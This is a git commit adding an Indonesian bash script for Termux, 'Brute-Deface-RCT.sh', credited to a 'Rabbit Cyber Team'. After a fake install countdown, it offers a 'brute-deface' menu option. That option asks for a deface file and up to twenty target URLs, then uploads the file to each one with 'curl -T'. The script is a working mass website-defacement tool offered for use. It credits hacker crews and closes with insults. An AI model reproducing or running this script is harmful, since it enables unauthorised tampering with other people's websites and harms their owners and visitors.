0831e4d4a91e1ae6daeca999ca63cab0f2146b13
RabbitCL4Y <44805762+RabbitCL4Y@users.noreply.github.com>
2018-12-15 22:58:03 +0800

    Create Brute-Deface-RCT.sh

---
+++ Brute-Deface-RCT.sh
@@ -0,0 +1,305 @@
+#Kalo mau recode izin dulu sama author
+#Bisa hubungi lewat Email: RabbitCL4Y123@gmail.com
+#Author: MR.CL4Y
+#!/system/xbin/bash
+green="\033[32;1m"
+yellow="\033[33;1m"
+indigo="\033[34;1m"
+ungu="\033[35;1m"
+cyan="\033[36;1m"
+white="\033[37;1m"
+red="\033[31;1m"
+clear
+echo
+echo
+echo
+echo
+echo $red"        TUNGGU TOOLS SELESAI DI INSTALL DALAM WAKTU 5 DETIK"
+echo $red"                     HARAP SABAR MENUNGGU :)"   
+sleep 1
+echo '''\a
+\033[34;1m                              _
+\033[34;1m                             / |
+\033[34;1m                             | |
+\033[34;1m                             | |
+\033[34;1m                             |_| '''
+sleep 1
+clear
+echo
+echo
+echo
+echo
+echo $red"        TUNGGU TOOLS SELESAI DI INSTALL DALAM WAKTU 5 DETIK"
+echo $red"                     HARAP SABAR MENUNGGU :)"
+sleep 1
+echo '''\a
+\033[32;1m                             ____
+\033[32;1m                            |___ \
+\033[32;1m                             __) |
+\033[32;1m                            / __/
+\033[32;1m                           |_____| '''
+sleep 1
+clear
+echo
+echo
+echo
+echo
+echo $red"        TUNGGU TOOLS SELESAI DI INSTALL DALAM WAKTU 5 DETIK"
+echo $red"                     HARAP SABAR MENUNGGU :)"
+sleep 1
+echo '''\a
+\033[35;1m                            _____
+\033[35;1m                           |___ /
+\033[35;1m                             |_ \
+\033[35;1m                            ___) |
+\033[35;1m                           |____/ '''
+sleep 1
+clear
+echo
+echo
+echo
+echo
+echo $red"        TUNGGU TOOLS SELESAI DI INSTALL DALAM WAKTU 5 DETIK"
+echo $red"                     HARAP SABAR MENUNGGU :)"
+sleep 1
+echo '''\a
+\033[33;1m                            _  _
+\033[33;1m                           | || |
+\033[33;1m                           | || |_
+\033[33;1m                           |__   _|
+\033[33;1m                              |_| '''
+sleep 1
+clear
+echo
+echo
+echo
+echo
+echo $red"        TUNGGU TOOLS SELESAI DI INSTALL DALAM WAKTU 5 DETIK"
+echo $red"                     HARAP SABAR MENUNGGU :)"
+sleep 1
+echo '''\a
+\033[36;1m                             ____
+\033[36;1m                            | ___|
+\033[36;1m                            |___ \
+\033[36;1m                             ___) |
+\033[36;1m                            |____/ '''
+sleep 1
+clear
+echo
+echo $red
+pkg install toilet -y
+clear
+echo $green
+pkg install figlet -y
+clear
+echo $cyan
+pkg install ruby -y
+clear
+gem install figlet
+clear
+gem install lolcat
+clear
+pkg install curl
+clear
+echo
+echo
+echo
+echo
+echo
+echo
+sleep 1
+toilet -f future "    Install selesai" | lolcat
+sleep 5
+clear
+echo
+echo
+echo
+echo
+echo
+echo
+toilet -f future " Wellcome to my tools" | lolcat
+sleep 5
+clear
+sh 77
+#!/system/xbin/bash
+# Bersihkan Layar
+clear
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+###################################################
+# CTRL C-
+###################################################
+trap ctrl_c INT
+ctrl_c() {
+clear
+echo  $red"[#]> (Ctrl + C ) Detected, 
+Trying To Exit ... "
+sleep 1
+echo ""
+echo  $yellow"[#]> Thank You For Using My 
+Tools ... "
+sleep 1
+echo ""
+echo  $white"[#]> Rabbit Cyber Team Was 
+Here ... "
+read enter
+exit
+}
+=================================================
+echo $red"kontak admin: 085752481601"
+echo $green"Author : MR.CL4Y"
+echo $blue"Team : Rabbit Cyber Team"
+echo $pink"Thanks To=Tp.T0kk3"
+echo $purple"Thanks To : MR.X TIKUS BERDASI"
+echo $cyan"Thanks To: Santri_Pasuruan"
+echo $white"Thanks To: Hvmbl3"
+echo $white"ytb channel: Santri pasuruan d1d4l3m"
+echo $blue"thanks to:MR.SNIPER"
+echo $cyan"thanks To : 2Easy 4Hack Team" 
+echo $red"thanks To : Milw0rm Cyber Team"
+echo $white"thanks To : Blackhat Hacker Indonesia"
+echo $yellow"thanks To : Art Cyber Team "
+echo $blue"thanks To : Curut Cyber Team "
+echo $red"thanks To: Indonesia termux association "
+echo $white"thanks to: Lul'Zsec Indo Team"
+=================================================
+echo $red" 1) brute-deface"
+echo  $red" 0) Exit "
+echo  $white""
+read -p "[root@Mr.CL4Y]> " bro;
+
+if [ $bro = 1 ] || [ $bro = 1 ]
+then
+clear
+echo $green"Brute-Deface-RCT"
+figlet -f smshadow "DEFACE-MASS"
+figlet -f smshadow "EXPLOIT"
+echo "### ctrl + c to quit ###"
+echo "Masukan Script !!!!"
+echo $white "╭─"$green"AMR@localhost"$cyan" ~/RCTsystem"$white                               
+read -p " ╰─$ " script
+echo "Masukan Target1 !!!!"
+echo $white "╭─"$green"AMR@localhost"$cyan" ~/RCTsystem"$white
+read -p " ╰─$ " target1
+curl -T /storage/emulated/0/$script $target1
+echo $cyan"["$green"+"$cyan"]"$red"$target1/$script"
+echo "Masukan Target2 !!!!"
+echo $white "╭─"$green"AMR@localhost"$cyan" ~/RCTsystem"$white
+read -p " ╰─$ " target2
+curl -T /storage/emulated/0/$script $target2
+echo $cyan"["$green"+"$cyan"]"$red"$target2/$script"
+echo "Masukan Target3 !!!!"
+echo $white "╭─"$green"AMR@localhost"$cyan" ~/RCTsystem"$white
+read -p " ╰─$ " target3
+curl -T /storage/emulated/0/$script $target3
+echo $cyan"["$green"+"$cyan"]"$red"$target3/$script"
+echo "Masukan Target4 !!!!"
+echo $white "╭─"$green"AMR@localhost"$cyan" ~/RCTsystem"$white
+read -p " ╰─$ " target4
+curl -T /storage/emulated/0/$script $target4
+echo $cyan"["$green"+"$cyan"]"$red"$target4/$script"
+echo "Masukan Target5 !!!!"
+echo $white "╭─"$green"AMR@localhost"$cyan" ~/RCTsystem"$white
+read -p " ╰─$ " target5
+curl -T /storage/emulated/0/$script $target5
+echo $cyan"["$green"+"$cyan"]"$red"$target5/$script"
+echo "Masukan Target6 !!!!"
+echo $white "╭─"$green"AMR@localhost"$cyan" ~/RCTsystem"$white
+read -p " ╰─$ " target6
+curl -T /storage/emulated/0/$script $target6
+echo $cyan"["$green"+"$cyan"]"$red"$target6/$script"
+echo "Masukan Target7 !!!!"
+echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
+read -p " ╰─$ " target7
+curl -T /storage/emulated/0/$script $target7
+echo $cyan"["$green"+"$cyan"]"$red"$target7/$script"
+echo "Masukan Target8 !!!!"
+echo $white "╭─"$green"AMR@localhost"$cyan" ~/RCTsystem"$white
+read -p " ╰─$ " target8
+curl -T /storage/emulated/0/$script $target8
+echo $cyan"["$green"+"$cyan"]"$red"$target8/$script"
+echo "Masukan Target9 !!!!"
+echo $white "╭─"$green"AMR@localhost"$cyan" ~/RCTsystem"$white
+read -p " ╰─$ " target9
+curl -T /storage/emulated/0/$script $target9
+echo $cyan"["$green"+"$cyan"]"$red"$target9/$script"
+echo "Masukan Target10 !!!! "
+echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
+read -p " ╰─$ " target10
+curl -T /storage/emulated/0/$script $target10
+echo $cyan"["$green"+"$cyan"]"$red"$target10/$script"
+echo "Masukan Target11 !!!! "
+echo $white "╭─"$green"AMR@localhost"$cyan" ~/RCTsystem"$white
+read -p " ╰─$ " target11
+curl -T /storage/emulated/0/$script $target11
+echo $cyan"["$green"+"$cyan"]"$red"$target11/$script"
+echo "Masukan Target12 !!!! "
+echo $white "╭─"$green"AMR@localhost"$cyan" ~/RCTsystem"$white
+read -p " ╰─$ " target12
+curl -T /storage/emulated/0/$script $target12
+echo $cyan"["$green"+"$cyan"]"$red"$target12/$script"
+echo "Masukan Target13 !!!! "
+echo $white "╭─"$green"AMR@localhost"$cyan" ~/RCTsystem"$white
+read -p " ╰─$ " target13
+curl -T /storage/emulated/0/$script $target13
+echo $cyan"["$green"+"$cyan"]"$red"$target13/$script"
+echo "Masukan Target14 !!!! "
+echo $white "╭─"$green"AMR@localhost"$cyan" ~/RCTsystem"$white
+read -p " ╰─$ " target14
+curl -T /storage/emulated/0/$script $target14
+echo $cyan"["$green"+"$cyan"]"$red"$target14/$script"
+echo "Masukan Target15 !!!! "
+echo $white "╭─"$green"AMR@localhost"$cyan" ~/RCTsystem"$white
+read -p " ╰─$ " target15
+curl -T /storage/emulated/0/$script $target15
+echo $cyan"["$green"+"$cyan"]"$red"$target15/$script"
+echo "Masukan Target16 !!!! "
+echo $white "╭─"$green"AMR@localhost"$cyan" ~/RCTsystem"$white
+read -p " ╰─$ " target16
+curl -T /storage/emulated/0/$script $target16
+echo $cyan"["$green"+"$cyan"]"$red"$target16/$script"
+echo "Masukan Target17 !!!! "
+echo $white "╭─"$green"AMR@localhost"$cyan" ~/RCTsystem"$white
+read -p " ╰─$ " target17
+curl -T /storage/emulated/0/$script $target17
+echo $cyan"["$green"+"$cyan"]"$red"$target17/$script"
+echo "Masukan Target18 !!!! "
+echo $white "╭─"$green"AMR@localhost"$cyan" ~/RCTsystem"$white
+read -p " ╰─$ " target18
+curl -T /storage/emulated/0/$script $target18
+echo $cyan"["$green"+"$cyan"]"$red"$target18/$script"
+echo "Masukan Target19 !!!! "
+echo $white "╭─"$green"AMR@localhost"$cyan" ~/RCTsystem"$white
+read -p " ╰─$ " target19
+curl -T /storage/emulated/0/$script $target19
+echo $cyan"["$green"+"$cyan"]"$red"$target19/$script"
+echo "Masukan Target20 !!!! "
+echo $white "╭─"$green"AMR@localhost"$cyan" ~/RCTsystem"$white
+read -p " ╰─$ " target20
+curl -T /storage/emulated/0/$script $target20
+echo $cyan"["$green"+"$cyan"]"$red"$target20/$script"
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] : " back
+fi
+
+if [ $bro = 0 ] || [ $bro = 0 ]
+then
+echo " Thanks To Rabbit Cyber Team "
+sleep 1
+echo " MR.CL4Y Was Here "
+sleep 1
+echo " Fuck You "
+sleep 1
+echo " MDFK "
+sleep 1
+echo " BITCH "
+sleep 1
+echo " Script Kiddie "
+sleep 1
+exit
+fi
